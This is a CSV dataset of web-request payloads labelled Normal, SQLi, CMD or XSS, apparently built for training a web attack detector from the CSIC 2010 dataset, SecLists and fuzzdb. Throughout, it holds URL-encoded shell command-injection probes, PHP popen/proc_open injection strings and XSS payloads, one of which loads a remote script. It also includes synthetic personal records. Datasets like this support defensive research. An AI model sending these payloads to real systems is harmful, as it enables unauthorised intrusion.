payload,label,source
%7C%20%5B%201%20-ne%20%24%28echo%20AWKJGV%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20,CMD,seclists_cmd
%3B%20str%3D%24%28echo%20EWYGBO%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20//,CMD,seclists_cmd
D65240E9A8B7693F05F0E0FFD185F2FB,Normal,csic_gsi:cisc_normalTraffic_test.txt
42066,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%3B%20str%3D%24%28echo%20ZSSQMT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20,CMD,seclists_cmd
7AB7CB0D00BE4FD73AEA9C9BBA5534C9,Normal,csic_gsi:cisc_normalTraffic_test.txt
CA5F440020AF0B090EF406CCE3152944,Normal,csic_gsi:cisc_normalTraffic_train.txt
&&echo%20QAGWEJ$((84%2B54))$(echo%20QAGWEJ)QAGWEJ&,CMD,seclists_cmd
;echo%20VPNQXQ$((3%2B65))$(echo%20VPNQXQ)VPNQXQ%5C%5C,CMD,seclists_cmd
Fuentes+de+Andaluc�a,Normal,csic_gsi:cisc_normalTraffic_train.txt
5E069BCFA0317E2FC693072F4EB812F5,Normal,csic_gsi:cisc_normalTraffic_test.txt
F5F3935D8C9AB8153743B59EF0983B80,Normal,csic_gsi:cisc_normalTraffic_test.txt
00A0ED04214844FA5744EBC8D4F15A74,Normal,csic_gsi:cisc_normalTraffic_test.txt
mane79,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2A5CF4877CFF0854B941E20C3C1EE84B,Normal,csic_gsi:cisc_normalTraffic_train.txt
8C19427413EFB091CEBAF770E1882EB0,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
turbes,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0D0149C846028EB7693F995B47F91502,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527%7C%20%5B%208%20-ne%20%24%28echo%20RHGVTL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C,CMD,seclists_cmd
1600B6D34B87C5FDF63CA4DB860A3941,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D2977005D4D8F4DF0A0ED9418FA7B44C,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20JTLWWU%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20,CMD,seclists_cmd
ceg.ama,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=712&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_train.txt
AA4374460F9D5186719F924E666CBEA1,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=7334bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Confirmar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1B7BA4B78794C8D354124F6DB268DF5D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
9E23C5EC58BE6E4F2291D25B1E7447DB,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%7C%20%5B%206%20-ne%20%24%28echo%20AYUZTB%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F,CMD,seclists_cmd
4AAAE50B90CBAEE399A238D3FD2D4393,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=danyelle&password=?flor�fero&nombre=.Quincio&apellidos=Gebhardt&email=reverend@enla.ae&dni=41928757X&direccion=C/+Los+Tilos,+118+12-B&ciudad=Altarejos&cp=44134&provincia=Toledo&ntc=4582988333379536&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",XSS,community:payloads_seed
E6D9359F4A84530C05987CC4E69AC45D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
b�lgico,Normal,csic_gsi:cisc_normalTraffic_train.txt
546E6D9DF414545B7D3574B7236C365C,Normal,csic_gsi:cisc_normalTraffic_test.txt
67A80F1280F921E18EF4D0601F1193F4,Normal,csic_gsi:cisc_normalTraffic_train.txt
galce,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&login=lundhild&pwd=159o229og2�930o&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Plza.+Virgen+Del+Carmen+197,+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2494761380533764,Normal,csic_gsi:cisc_normalTraffic_test.txt
edwige,Normal,csic_gsi:cisc_normalTraffic_test.txt
1373405933057290,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%3B%20str%3D%24%28echo%20PSUJGU%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20//,CMD,seclists_cmd
3F9CBB35045428F4D740C2AD437F407D,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%0A%20str%3D%24%28echo%20HKGDXH%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%26,CMD,seclists_cmd
'echo$IFSZAZMGS$((53%2B59))$(echo$IFSZAZMGS)ZAZMGS%27,CMD,seclists_cmd
&&echo%20TQHCUN$((6%2B71))$(echo%20TQHCUN)TQHCUN,CMD,seclists_cmd
jamel,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Navia,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20YCZVOO%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%252F%252F,CMD,seclists_cmd
%2527%0A%20str%3D%24%28echo%20KARBCX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C,CMD,seclists_cmd
5CB382A3DEDE683C7262181C3ED43D60,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20DKKEQZ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2526,CMD,seclists_cmd
modo=registro&login=boinnard&password=alARgUEZ&nombre=Celinda&apellidos=Alberti&email=moriconi@x2.com.pro&dni=75775962R&direccion=Enpar+antza+Jose+M+aria+Makua+129+9B&ciudad=Montesclaros&cp=46230&provincia=Alicante&ntc=7573620242761583&B1=Registrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
watts@viajesnacionales.na,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20KTBJHD%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C,CMD,seclists_cmd
id=1&nombre=Vino+Rioja&precio=100&cantidad=58&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
unicorn@devuelos.ru,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A776710B223FDC13C78F02304D0CF55E,Normal,csic_gsi:cisc_normalTraffic_test.txt
41D118B734838CB94752CDAA5BB89AC9,Normal,csic_gsi:cisc_normalTraffic_test.txt
||echo$IFSJTVIEI$((59%2B6))$(echo$IFSJTVIEI)JTVIEI&,CMD,seclists_cmd
kawaguch,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2C69B3E3D832165B9E1682FBF7C8157D,Normal,csic_gsi:cisc_normalTraffic_test.txt
79BB90FC733FA085A858F6CB173BEFE3,Normal,csic_gsi:cisc_normalTraffic_train.txt
1BCE454BA1D6B91ED2D2839827EE5B6C,Normal,csic_gsi:cisc_normalTraffic_train.txt
ops,Normal,csic_gsi:cisc_normalTraffic_test.txt
F4B2A7575C19EB298A82EE07C3F2DA16,Normal,csic_gsi:cisc_normalTraffic_test.txt
165911526940970,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Lazkao,Normal,csic_gsi:cisc_normalTraffic_test.txt
F1550BCDB294B661DE289FF1BC460576,Normal,csic_gsi:cisc_normalTraffic_test.txt
51A369013702AA877F979C0474F59A58,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Sashya,Normal,csic_gsi:cisc_normalTraffic_train.txt
dorita,Normal,csic_gsi:cisc_normalTraffic_train.txt
368039EE09E6D054369E901DF87A28F9,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20WQWTED%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%5C%5C,CMD,seclists_cmd
"C/+a+Costeira,+192,+4?A",Normal,csic_gsi:cisc_normalTraffic_test.txt
repugnancia,Normal,csic_gsi:cisc_normalTraffic_test.txt
96118316M,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
67B900623500E5AFEC0BB6E609318B4F,Normal,csic_gsi:cisc_normalTraffic_test.txt
9CB89D5978120F454BC24F8D6B6533B7,Normal,csic_gsi:cisc_normalTraffic_test.txt
991696580673491930B5F57C67E563A3,Normal,csic_gsi:cisc_normalTraffic_test.txt
6853C4031A4B8D9F9B56B8FDEE2D7D72,Normal,csic_gsi:cisc_normalTraffic_train.txt
1951,Normal,csic_gsi:cisc_normalTraffic_train.txt
villella,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Santalo+Gabas,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
&&echo$IFSKMSEPJ$((48%2B32))$(echo$IFSKMSEPJ)KMSEPJ//,CMD,seclists_cmd
"modo=registro&login=markland&password=6os878rn8&nombre=Nolsaco&apellidos=Zarzalejo+Vendrell&email=coulson.koster@lasiestacreativa.ph&dni=17456236H&direccion=Plza.+De+Los+Jardinillos+75,+&ciudad=Esguevillas+de+Esgueva&cp=34757&provincia=A+Coru�a&ntcA=2659545873561160&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Vilmar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
;echo$IFSCKYHAJ$((39%2B53))$(echo$IFSCKYHAJ)CKYHAJ|,CMD,seclists_cmd
BE598FFC559B4B0EEAD4632408509571,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8601557814301462,Normal,csic_gsi:cisc_normalTraffic_train.txt
5A92F49709309B52F52668A68DE0018D,Normal,csic_gsi:cisc_normalTraffic_test.txt
10D2321BB18487F70F586C8D131D5C7C,Normal,csic_gsi:cisc_normalTraffic_train.txt
0018896F4BC006419D6A5EC26D022943,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%20%5B%204%20-ne%20%24%28echo%20MRDZPJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%22,CMD,seclists_cmd
173402B1CA7AE3DB57542C0973840AF2,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
leroi,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20EHRUXO%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20//,CMD,seclists_cmd
cabotaje,Normal,csic_gsi:cisc_normalTraffic_test.txt
C13B765BE190B4B11F65D7EC2E223746,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20MYWJNW%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%257C,CMD,seclists_cmd
11954779T,Normal,csic_gsi:cisc_normalTraffic_train.txt
A788D1389267BB337A146F6672910D38,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
'.print(`echo%20YBQGFX%0aecho%20$((90%2B18))%0aecho%20YBQGFX%0aecho%20YBQGFX`)%3B%252523YBQGFX,CMD,seclists_cmd
%0A%20str%3D%24%28echo%20MKJXCW%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,CMD,seclists_cmd
CAF190E0A414745DD67BA79F28939CAB,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
799979CEDF19FD63B0FC87C5D889CC1B,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Iglesuela+del+Cid,+La",Normal,csic_gsi:cisc_normalTraffic_train.txt
%20echo%20NWXHAH$((8%2B91))$(echo%20NWXHAH)NWXHAH%5C%5C,CMD,seclists_cmd
39?5,Normal,csic_gsi:cisc_normalTraffic_test.txt
2FDE1D730797B03A6FA5A39D215252C9,Normal,csic_gsi:cisc_normalTraffic_test.txt
66B3F7385580250D5C2B93A5122922B3,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ATDESO%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20,CMD,seclists_cmd
A734515702F19F608B8D4DBBE0D91243,Normal,csic_gsi:cisc_normalTraffic_train.txt
'%26echo%20SYNXTK$((0%2B99))$(echo%20SYNXTK)SYNXTK%7C,CMD,seclists_cmd
A98B7F85B2B87CE90E34EC69D9005523,Normal,csic_gsi:cisc_normalTraffic_train.txt
${popen(print(`echo%20UQCXVD\necho%20$((60%2B78))\necho%20UQCXVD\necho%20UQCXVD`)%3B%2525255C%2525255CUQCXVD,CMD,seclists_cmd
modo=entrar&loginA=macmulli6&pwd=A1391+18u46&remember=on&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5BD2B2C0A289EDB441043B0EB905321C,Normal,csic_gsi:cisc_normalTraffic_train.txt
1447E6DF8819E0242765BB87B0FF2EEB,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
charney@pro-isfv.mp,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
56F36A1A8BF2E05C6E87DBCA7B467CE1,Normal,csic_gsi:cisc_normalTraffic_test.txt
neusy,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%7Cecho$IFSLCASZZ$((36%2B54))$(echo$IFSLCASZZ)LCASZZ,CMD,seclists_cmd
E7F425B39B56AAAA29D864730DFA28E3,Normal,csic_gsi:cisc_normalTraffic_train.txt
217F78CC207E456A2A1692C4C63CF391,Normal,csic_gsi:cisc_normalTraffic_train.txt
carmet@programa-gestion-erp.ao,Normal,csic_gsi:cisc_normalTraffic_test.txt
co85863o,Normal,csic_gsi:cisc_normalTraffic_train.txt
A4ACEDDAC9D950A4CA702E58D7DF8BA9,Normal,csic_gsi:cisc_normalTraffic_test.txt
41DAA5324B6B47CA660C1820E6E523E9,Normal,csic_gsi:cisc_normalTraffic_test.txt
AE8E6CF0B3979F68364AC8353B531692,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%0A%20str%3D%24%28echo%20FPLFHR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,seclists_cmd
725A5B34A4E3F22D777BBAB3D129235B,Normal,csic_gsi:cisc_normalTraffic_test.txt
0DE65E49539C467217F23E48C1CC331C,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=makary&password=fanfarronesca&nombre=Altair&apellidos=Herba+Polit&email=castillo@ajuntamentbcn20.et&dni=63829860F&direccion=Calle+Mas+Duran+155,+&ciudad=Punx�n&cp=16708&provincia=Pontevedra&ntc=8017619321044224&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%7C%20%5B%201%20-ne%20%24%28echo%20EUILIT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27,CMD,seclists_cmd
6C5D1B9020255C09E8E662A357FE5B7B,Normal,csic_gsi:cisc_normalTraffic_test.txt
sprotte.banner@furgos.com.es,Normal,csic_gsi:cisc_normalTraffic_test.txt
CE9C59B2DBD42B7402805F1FEE545842,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20FUFPKN%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F,CMD,seclists_cmd
5F685D782396840B53F036D3D5CF43DF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
08B7D4A215E3FE9F0C77FF29E3A32088,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7Cecho$IFSAQWEET$((38%2B66))$(echo$IFSAQWEET)AQWEET\,CMD,seclists_cmd
Od�n,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
35239980R,Normal,csic_gsi:cisc_normalTraffic_test.txt
San+Crist�bal+de+la+Cuesta,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
70E5AACEDCD16B9FF21FC563B0273CE0,Normal,csic_gsi:cisc_normalTraffic_train.txt
6B3E22BF3D04A7547BD7A9198C31D42E,Normal,csic_gsi:cisc_normalTraffic_test.txt
|echo$IFSUFZURL$((39%2B84))$(echo$IFSUFZURL)UFZURL|,CMD,seclists_cmd
"modo=registro&login=montsko&password=3ohe2a&nombre=Galo&apellidos=Vilaltel+Pi�&email=bousquet@espaciopintor.mu&dni=45610346N&direccion=Travesia+Espronceda,+79,+&ciudadA=Bovera&cp=49331&provincia=Alicante&ntc=7436543016138200&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1F5717EC87475F1F8360419C30B2BB11,Normal,csic_gsi:cisc_normalTraffic_test.txt
5431,Normal,csic_gsi:cisc_normalTraffic_test.txt
EE8DAA164D3FD073A88B0A054CD6297E,Normal,csic_gsi:cisc_normalTraffic_train.txt
mar4o,Normal,csic_gsi:cisc_normalTraffic_test.txt
%27;echo$IFSXUUDGE$((67%2B2))$(echo$IFSXUUDGE)XUUDGE%2F%2F,CMD,seclists_cmd
&&echo$IFSCAAYWG$((20%2B2))$(echo$IFSCAAYWG)CAAYWG%22,CMD,seclists_cmd
4D358E8707D580611DD6316CDFC32347,Normal,csic_gsi:cisc_normalTraffic_test.txt
8B1793D68B653DFA67BE94E00C171DA4,Normal,csic_gsi:cisc_normalTraffic_train.txt
${proc_open(print(`echo%20LUFXAF;echo%20$((85%2B77));echo%20LUFXAF;echo%20LUFXAF`)%3B%2523LUFXAF,CMD,seclists_cmd
"modo=registro&login=antai&password=3a2rimo19&nombre=Pangui&apellidos=Arbel�ez+Grippo&email=alzucaray-randol@juanpolo.dz&dni=21335513T&direccion=Calle+Benito+Monfort+60,+&ciudad=Ba�os+de+Ebro/Ma�ueta&cp=09140&provincia=Pontevedra&ntc=8995996565558024&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
Zorita,Normal,csic_gsi:cisc_normalTraffic_test.txt
9E297474C41BB3A8589A522087EF722C,Normal,csic_gsi:cisc_normalTraffic_test.txt
36F3F418876610BF620913DE2D1CF4EE,Normal,csic_gsi:cisc_normalTraffic_test.txt
%27%0A%20str%3D%24%28echo%20FPLFHR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,seclists_cmd
%7C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
08501,Normal,csic_gsi:cisc_normalTraffic_test.txt
dorsey@pintandomucho.qa,Normal,csic_gsi:cisc_normalTraffic_test.txt
CBA6F1BFA7D29AFBAEACD222D02A6DF3,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=2&nombre=Queso+Manchego&precioA=85&cantidad=86&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ENIIMV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23,CMD,seclists_cmd
2A6D1C1B37ACB1D054403A18CD6EC2EC,Normal,csic_gsi:cisc_normalTraffic_train.txt
13BBAC58A8B36954BD1632615DF7460B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
DC3C5BA336F94D0DF116B177185F1D19,Normal,csic_gsi:cisc_normalTraffic_train.txt
98DD7789EB263E75CC725A05DA61E891,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20UVFUKR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20,CMD,seclists_cmd
C59E1D065F88126535E591FC47A79436,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%7C%20%5B%204%20-ne%20%24%28echo%20IDQLWW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F,CMD,seclists_cmd
modo=entrar&login=tachih&pwd=lombriz&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
kimiko,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ZSTLVQ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%26,CMD,seclists_cmd
D55716EA731B2807A8A53C319EC6C065,Normal,csic_gsi:cisc_normalTraffic_test.txt
F51932A56C9230032B3E21B3DECAA1F4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
01423,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
petrucci@cortinasartesol.it,Normal,csic_gsi:cisc_normalTraffic_test.txt
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>,XSS,fuzzdb_xss
Celina,Normal,csic_gsi:cisc_normalTraffic_test.txt
8044294456559903,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=3755&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_test.txt
"%26echo%20UCMRWH$((43%2B12))$(echo%20UCMRWH)UCMRWH""",CMD,seclists_cmd
|echo$IFSZIARXP$((32%2B15))$(echo$IFSZIARXP)ZIARXP%5C%5C,CMD,seclists_cmd
%7C%7Cecho$IFSXRJUZC$((77%2B52))$(echo$IFSXRJUZC)XRJUZC%27,CMD,seclists_cmd
Vaciar+carrito?,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1442431887503330,Normal,csic_gsi:cisc_normalTraffic_train.txt
carolien,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
47745907T,Normal,csic_gsi:cisc_normalTraffic_test.txt
Cabrejas+del+Pinar,Normal,csic_gsi:cisc_normalTraffic_train.txt
F87618A7B2633EAE9D1C6AC409DEFC05,Normal,csic_gsi:cisc_normalTraffic_train.txt
607,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%3B%20str%3D%24%28echo%20TLXEJK%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%22,CMD,seclists_cmd
95EECB3A5AE313394587F25DFC33822D,Normal,csic_gsi:cisc_normalTraffic_train.txt
1424311090905946,Normal,csic_gsi:cisc_normalTraffic_test.txt
Holguera,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8FFB761AFC172740A0979F0B5D0AF4E7,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A22897AFB793752603D3EB4734A7BD1B,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%206%20-ne%20%24%28echo%20IZDFYZ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23,CMD,seclists_cmd
Amiel,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
hocyigit.melies@921.jobs,Normal,csic_gsi:cisc_normalTraffic_test.txt
"C/+Do+Vali�o,+156,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
id=3&nombreA=Queso+Manchego&precio=39&cantidad=19&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6C557A714512EAB0EF62496D5796E0F0,Normal,csic_gsi:cisc_normalTraffic_test.txt
4D70315F1B3A13BAA17A98B0FB04DD7F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Amazarray+Gersol,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
654261ITU2A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8038CB22CDF01EF3B478B8E0B72213C0,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&login=balwinde&pwd=nac�reo&remember=off&B1A=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Peirat�+Bellv�,Normal,csic_gsi:cisc_normalTraffic_train.txt
7CC1114604A8043B1DAE6523B24C1770,Normal,csic_gsi:cisc_normalTraffic_test.txt
4662AFF4A7F87D1B192E79662D6FF8DB,Normal,csic_gsi:cisc_normalTraffic_test.txt
F75DCDD2B6F7D7C56738AC7B47FA44DB,Normal,csic_gsi:cisc_normalTraffic_train.txt
3218,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20IYDPRO%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%252F%252F,CMD,seclists_cmd
karnilova0@ticketsport.gi,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=selene&password=devengar&nombre=Oberto&apellidos=Uruburu+Ayensa&email=maxim@copiar.com.ck&dni=10993485Z&direccion=Rociana,+104+&ciudad=Benicarl�&cp=04212&provincia=C�ceres&ntc=0941389957608729&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
perier@chevrolet-volt.in,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=registro&login=nuri&password=incisorio&nombre=Emli&apellidos=Florit+Tobella&email=spacey@cincocolores.lv&dni=28196220Z&direccion=Peguera+139+12-G&ciudad=Alpandeire&cp=05194&provincia=Burgos&ntc=1814135262373057&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
51fo53a83,Normal,csic_gsi:cisc_normalTraffic_test.txt
